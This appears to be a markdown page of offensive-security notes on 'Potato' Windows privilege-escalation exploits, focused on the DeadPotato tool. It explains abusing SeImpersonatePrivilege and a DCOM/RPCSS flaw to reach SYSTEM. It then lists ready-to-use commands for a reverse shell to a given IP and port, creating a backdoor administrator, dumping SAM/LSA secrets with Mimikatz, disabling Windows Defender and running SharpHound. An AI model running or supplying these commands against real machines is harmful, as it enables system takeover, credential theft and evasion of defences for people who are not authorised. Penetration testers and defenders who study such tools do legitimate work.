# Potato Exploits

### 1) Dead Potato

Link: https://github.com/lypd0/DeadPotato

#### Usage

The SeImpersonatePrivilege right is enabled in your context? With DeadPotato, it is possible to achieve maximum privileges on the local system.

The tool will attempt to start an elevated process running in the context of the NT AUTHORITY\SYSTEM user by abusing the DCOM's RPCSS flaw in handling OXIDs, allowing unrestricted access over the machine for critical operations to be freely performed.

    C:\Users\lypd0> GodPotato.exe
  
    ⠀⢀⣠⣤⣤⣄⡀⠀    _           _
    ⣴⣿⣿⣿⣿⣿⣿⣦   | \ _  _  _||_) _ _|_ _ _|_ _
    ⣿⣿⣿⣿⣿⣿⣿⣿   |_/(/_(_|(_||  (_) |_(_| |_(_)
    ⣇⠈⠉⡿⢿⠉⠁⢸   Open Source @ github.com/lypd0
    ⠙⠛⢻⣷⣾⡟⠛⠋         -= Version: 1.2 =-
        ⠈⠁⠀⠀⠀

    _,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_
  
     (*) Example Usage(s):

     -={ deadpotato.exe -MODULE [ARGUMENTS] }=-

     -> deadpotato.exe -cmd "whoami"
     -> deadpotato.exe -rev 192.168.10.30:9001
     -> deadpotato.exe -exe paylod.exe
     -> deadpotato.exe -newadmin lypd0:DeadPotatoRocks1
     -> deadpotato.exe -shell
     -> deadpotato.exe -mimi sam
     -> deadpotato.exe -defender off
     -> deadpotato.exe -sharphound

     (*) Available Modules:

     - cmd: Execute a command as NT AUTHORITY\SYSTEM.
     - rev: Attempts to establish a reverse shell connection to the provided host
     - exe: Execute a program with NT AUTHORITY\SYSTEM privileges (Does not support interactivity).
     - newadmin: Create a new administrator user on the local system.
     - shell: Manages to achieve a semi-interactive shell (NOTE: Very bad OpSec!)
     - mimi: Attempts to dump SAM/LSA/SECRETS with Mimikatz. (NOTE: This will write mimikatz to disk!)
     - defender: Either enables or disables Windows Defender's real-time protection.
     - sharphound: Attempts to collect domain data for BloodHound.

